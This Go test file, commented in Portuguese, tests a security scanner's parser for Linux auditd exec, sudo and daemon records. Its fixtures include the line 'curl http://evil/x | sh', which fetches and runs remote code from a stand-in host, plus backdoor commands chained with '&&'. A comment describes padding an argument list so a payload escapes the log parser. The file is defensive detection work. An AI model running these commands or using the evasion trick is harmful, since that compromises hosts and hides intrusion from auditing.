package facts

import (
	"strconv"
	"strings"
	"testing"
)

// O CASO CENTRAL: quatro registros, um evento, e o caminho RESOLVIDO.
//
// `a0="./x"` não responde pergunta nenhuma — não dá para perguntar quem é o dono
// do pacote de `./x`, nem se ele ainda existe. `/tmp/x` responde as duas, e é
// para isso que o CWD é lido e o grupo é montado.
func TestMontaExecveDeQuatroRegistros(t *testing.T) {
	linhas := []string{
		`type=SYSCALL msg=audit(1755990137.123:456): arch=c000003e syscall=59 success=yes exit=0 ppid=1000 pid=1001 auid=1001 uid=1001 gid=1001 euid=0 comm="sh" exe="/bin/dash" key="exec"`,
		`type=EXECVE msg=audit(1755990137.123:456): argc=2 a0="./x" a1="-q"`,
		`type=CWD msg=audit(1755990137.123:456): cwd="/tmp"`,
		`type=PATH msg=audit(1755990137.123:456): item=0 name="/tmp/x" inode=99 dev=fd:01 mode=0100755 ouid=0 ogid=0`,
	}
	ev := montaDeLinhas(t, linhas)

	if ev.Kind != "audit.exec" {
		t.Errorf("Kind = %q", ev.Kind)
	}
	if ev.At != "2025-08-23T23:02:17Z" || !ev.AtKnown {
		t.Errorf("At = %q (o epoch do auditd é UTC e não infere nada)", ev.At)
	}
	if ev.Serial != 456 {
		t.Errorf("Serial = %d", ev.Serial)
	}
	if !temAlvo(ev, "/tmp/x") {
		t.Errorf("o alvo resolvido não está nos alvos: %v", ev.Alvos)
	}
	if ev.UID != 1001 || !ev.UIDKnown {
		t.Errorf("UID = %d known=%v", ev.UID, ev.UIDKnown)
	}
	if ev.PID != 1001 || ev.Process != "sh" {
		t.Errorf("PID=%d Process=%q", ev.PID, ev.Process)
	}
}

// SEM O PATH, o caminho sai da composição cwd + argv[0]. É o que acontece quando
// a regra de auditoria não registra PATH, e ainda assim a pergunta precisa ser
// respondível.
func TestSemPathOCaminhoSaiDoCwd(t *testing.T) {
	ev := montaDeLinhas(t, []string{
		`type=SYSCALL msg=audit(1755990137.000:1): syscall=59 pid=2 uid=0 comm="x" exe="/tmp/.h/x"`,
		`type=EXECVE msg=audit(1755990137.000:1): argc=1 a0="./x"`,
		`type=CWD msg=audit(1755990137.000:1): cwd="/tmp/.h"`,
	})
	if !temAlvo(ev, "/tmp/.h/x") {
		t.Errorf("alvos = %v, quer /tmp/.h/x composto do cwd", ev.Alvos)
	}
}

// O HEX é obrigatório sempre que o valor tem ESPAÇO — audit_string_contains_control
// manda para hex qualquer byte < 0x21, e 0x20 é espaço. Um caminho com espaço é
// o caso comum disso, não uma curiosidade.
func TestArgumentoEmHexEComEspaco(t *testing.T) {
	// "/tmp/um arquivo" em hex.
	hex := ""
	for _, b := range []byte("/tmp/um arquivo") {
		const d = "0123456789ABCDEF"
		hex += string(d[b>>4]) + string(d[b&0xf])
	}
	ev := montaDeLinhas(t, []string{
		`type=SYSCALL msg=audit(1755990137.000:2): syscall=59 pid=3 uid=0 comm="sh"`,
		`type=EXECVE msg=audit(1755990137.000:2): argc=1 a0=` + hex,
		`type=PATH msg=audit(1755990137.000:2): item=0 name=` + hex,
	})
	if !temAlvo(ev, "/tmp/um arquivo") {
		t.Errorf("alvos = %v — o hex não foi decodificado", ev.Alvos)
	}
}

// ARGUMENTO PARTIDO: o que não cabe no buffer sai em `aN_len` + `aN[0]`,
// `aN[1]`… Ler só o `aN` daria string VAZIA justamente para o argumento mais
// longo, que é onde mora o payload de uma linha ofuscada.
func TestArgumentoPartidoEmPedacos(t *testing.T) {
	ev := montaDeLinhas(t, []string{
		`type=SYSCALL msg=audit(1755990137.000:3): syscall=59 pid=4 uid=0 comm="sh" exe="/bin/dash"`,
		`type=EXECVE msg=audit(1755990137.000:3): argc=3 a0="/bin/sh" a1="-c" a2_len=26 a2[0]="curl http://evil/" a2[1]="x | sh"`,
		`type=PATH msg=audit(1755990137.000:3): item=0 name="/bin/dash"`,
	})
	if !strings.Contains(ev.Trecho, "curl http://evil/x | sh") {
		t.Errorf("o argumento partido não foi remontado: %q", ev.Trecho)
	}
}

// `sh -c` é o caso em que o alvo do exec NÃO é o programa que interessa: o
// binário executado é o shell. Mesmo raciocínio do ExecStart de unit, e mesmo
// resolvedor — inclusive para o `&&`, que já escondeu backdoor uma vez.
func TestShellComCPassaPeloResolvedorDeAlvos(t *testing.T) {
	ev := montaDeLinhas(t, []string{
		`type=SYSCALL msg=audit(1755990137.000:4): syscall=59 pid=5 uid=0 comm="sh" exe="/bin/dash"`,
		`type=EXECVE msg=audit(1755990137.000:4): argc=3 a0="/bin/sh" a1="-c" a2="/usr/bin/true && /usr/lib/.backdoor"`,
		`type=PATH msg=audit(1755990137.000:4): item=0 name="/bin/sh"`,
	})
	if !temAlvo(ev, "/usr/lib/.backdoor") {
		t.Errorf("o segundo programa da linha sumiu: %v", ev.Alvos)
	}
}

// USER_CMD carrega os campos DENTRO de um `msg='…'` aninhado. Sem desembrulhar,
// o `cmd=` — que é o que o sudo executou — fica invisível.
func TestUserCmdComEnvelopeAninhado(t *testing.T) {
	ev := montaDeLinhas(t, []string{
		`type=USER_CMD msg=audit(1755990137.000:5): pid=9 uid=1000 auid=1000 ses=3 ` +
			`msg='cwd="/home/deploy" cmd=2F746D702F2E757064 terminal=pts/0 res=success' ` +
			`acct="deploy"`,
	})
	if ev.Kind != "auth.sudo" {
		t.Fatalf("Kind = %q", ev.Kind)
	}
	if !temAlvo(ev, "/tmp/.upd") {
		t.Errorf("alvos = %v — o cmd em hex do envelope aninhado não foi lido", ev.Alvos)
	}
	if ev.User != "deploy" {
		t.Errorf("User = %q", ev.User)
	}
}

// O CAMPO NUMÉRICO NÃO É HEX, e decodificar por forma o corromperia: "1234" tem
// comprimento par e só dígitos hexadecimais, e viraria os bytes 0x12 0x34 —
// silenciosamente, num campo que decide correlação.
func TestCampoNumericoNaoEhDecodificadoComoHex(t *testing.T) {
	r, ok := parseRegistroAudit(`type=SYSCALL msg=audit(1755990137.000:6): pid=1234 uid=1000 comm="sh"`)
	if !ok {
		t.Fatal("não parseou")
	}
	if r.Campos["pid"] != "1234" {
		t.Errorf("pid = %q, quer 1234 intacto", r.Campos["pid"])
	}
	if r.Campos["uid"] != "1000" {
		t.Errorf("uid = %q", r.Campos["uid"])
	}
}

// A IDENTIDADE É O PAR (epoch, serial). O serial é u32 e REINICIA: dois eventos
// distintos com o mesmo número colidiriam num só, e o caminho de um sairia
// atribuído ao outro.
func TestSerialRepetidoComEpochDiferenteSaoEventosDISTINTOS(t *testing.T) {
	m := novoMontadorDeAudit()
	for _, l := range []string{
		`type=SYSCALL msg=audit(1755990137.000:7): syscall=59 pid=1 uid=0 comm="a"`,
		`type=EXECVE msg=audit(1755990137.000:7): argc=1 a0="/bin/a"`,
		`type=SYSCALL msg=audit(1755999999.000:7): syscall=59 pid=2 uid=0 comm="b"`,
		`type=EXECVE msg=audit(1755999999.000:7): argc=1 a0="/bin/b"`,
	} {
		r, ok := parseRegistroAudit(l)
		if !ok {
			t.Fatalf("não parseou: %s", l)
		}
		m.Alimenta(r)
	}
	evs := m.Fecha()
	if len(evs) != 2 {
		t.Fatalf("%d evento(s), quer 2 — o mesmo serial em epochs diferentes é outro evento", len(evs))
	}
	if !temAlvo(evs[0], "/bin/a") || !temAlvo(evs[1], "/bin/b") {
		t.Errorf("os alvos se misturaram: %v e %v", evs[0].Alvos, evs[1].Alvos)
	}
}

// O TETO DE GRUPOS ABERTOS é contra o arquivo PLANTADO: um milhão de seriais
// órfãos consumiria memória sem limite, e a varredura morreria com exit 2 — que
// a frota lê como comprometimento.
func TestTetoDeGruposAbertosNaoDeixaAMemoriaCrescer(t *testing.T) {
	m := novoMontadorDeAudit()
	saiu := 0
	for i := 0; i < maxGruposAuditAbertos+50; i++ {
		r, ok := parseRegistroAudit(`type=SYSCALL msg=audit(175599.00` +
			strconv.Itoa(i%10) + `:` + strconv.Itoa(i) + `): syscall=59 pid=1 uid=0 comm="x"`)
		if !ok {
			t.Fatalf("não parseou no i=%d", i)
		}
		saiu += len(m.Alimenta(r))
	}
	if len(m.grupos) > maxGruposAuditAbertos {
		t.Errorf("%d grupos abertos, teto é %d", len(m.grupos), maxGruposAuditAbertos)
	}
	if m.FechadosPorTeto == 0 {
		t.Error("o teto mordeu e não foi contado: sem a contagem não há lacuna a declarar")
	}
	if saiu == 0 {
		t.Error("os grupos fechados pelo teto precisam SAIR como evento, não sumir")
	}
}

// DAEMON_ABORT e DAEMON_END são a mesma CONCLUSÃO — a trilha tem buraco — e o
// coletor não decide severidade. Quem separa parada administrativa de queda é o
// check, e ele usa o Metodo.
func TestDaemonAbortEEndViramAuditLostComMetodoDistinto(t *testing.T) {
	for _, c := range []struct{ tipo, metodo string }{
		{"DAEMON_ABORT", "abort"},
		{"DAEMON_END", "end"},
	} {
		ev := montaDeLinhas(t, []string{
			`type=` + c.tipo + ` msg=audit(1755990137.000:8): op=terminate auid=0 pid=1 res=success`,
		})
		if ev.Kind != "audit.lost" {
			t.Errorf("%s: Kind = %q", c.tipo, ev.Kind)
		}
		if ev.Metodo != c.metodo {
			t.Errorf("%s: Metodo = %q, quer %q", c.tipo, ev.Metodo, c.metodo)
		}
	}
}

func TestKernModuleEAnomAbendSaoFonteEstruturada(t *testing.T) {
	ev := montaDeLinhas(t, []string{
		`type=KERN_MODULE msg=audit(1755990137.000:9): name="socknd"`,
	})
	if ev.Kind != "kernel.module_loaded" || !temAlvo(ev, "socknd") {
		t.Errorf("KERN_MODULE: Kind=%q alvos=%v", ev.Kind, ev.Alvos)
	}

	ev = montaDeLinhas(t, []string{
		`type=ANOM_ABEND msg=audit(1755990137.000:10): auid=1000 uid=1000 pid=77 comm="nginx" exe="/usr/sbin/nginx" sig=11 res=1`,
	})
	if ev.Kind != "kernel.segfault" || ev.Process != "nginx" {
		t.Errorf("ANOM_ABEND: Kind=%q Process=%q", ev.Kind, ev.Process)
	}
}

// Linha que não é registro de audit não vira registro — e não vira evento vazio.
func TestLinhaQueNaoEhAuditEhRecusada(t *testing.T) {
	for _, l := range []string{
		"",
		"Aug 24 01:20:33 host sshd[1]: Accepted password for ana",
		"type=SYSCALL sem envelope",
		"type=SYSCALL msg=audit(abc:def): x=1",
	} {
		if _, ok := parseRegistroAudit(l); ok {
			t.Errorf("%q não deveria parsear", l)
		}
	}
}

// ---------------------------------------------------------------------------

func montaDeLinhas(t *testing.T, linhas []string) EventoDeLog {
	t.Helper()
	m := novoMontadorDeAudit()
	for _, l := range linhas {
		r, ok := parseRegistroAudit(l)
		if !ok {
			t.Fatalf("não parseou: %s", l)
		}
		m.Alimenta(r)
	}
	evs := m.Fecha()
	if len(evs) != 1 {
		t.Fatalf("%d eventos, quer 1: %v", len(evs), evs)
	}
	return evs[0]
}

func temAlvo(ev EventoDeLog, alvo string) bool {
	for _, a := range ev.Alvos {
		if a == alvo {
			return true
		}
	}
	return false
}

// UM EXECVE PODE VIR EM VÁRIOS REGISTROS, e ficar com o primeiro descarta a
// CAUDA da linha de comando.
//
// Não é especulação sobre o auditd: quando o buffer não comporta mais
// argumento, audit_log_execve_info() fecha o registro e abre outro
// AUDIT_EXECVE no mesmo contexto — `audit_log_end(*ab); *ab =
// audit_log_start(…, AUDIT_EXECVE)`, em kernel/auditsc.c.
//
// O caminho de evasão é barato e não precisa de nada exótico:
//
//	sh -c '<argumentos benignos até encher o buffer> ; /tmp/.payload'
//
// Se o payload cair no segundo registro, a execução é reconstruída sem ele — e
// sem lacuna nenhuma, porque do ponto de vista do parser tudo foi lido.
func TestExecveEmVariosRegistrosDoMesmoSerial(t *testing.T) {
	ev := montaDeLinhas(t, []string{
		`type=SYSCALL msg=audit(1755990137.000:77): syscall=59 pid=9 uid=0 comm="sh" exe="/bin/dash"`,
		`type=EXECVE msg=audit(1755990137.000:77): argc=4 a0="/bin/sh" a1="-c"`,
		`type=EXECVE msg=audit(1755990137.000:77): a2="/usr/bin/true && /tmp/.backdoor" a3="ruido"`,
		`type=PATH msg=audit(1755990137.000:77): item=0 name="/bin/sh"`,
	})
	if !temAlvo(ev, "/tmp/.backdoor") {
		t.Errorf("a cauda do argv veio no SEGUNDO registro e sumiu: %v — trecho %q",
			ev.Alvos, ev.Trecho)
	}
	if !strings.Contains(ev.Trecho, "ruido") {
		t.Errorf("o último argumento também se perdeu: %q", ev.Trecho)
	}
}
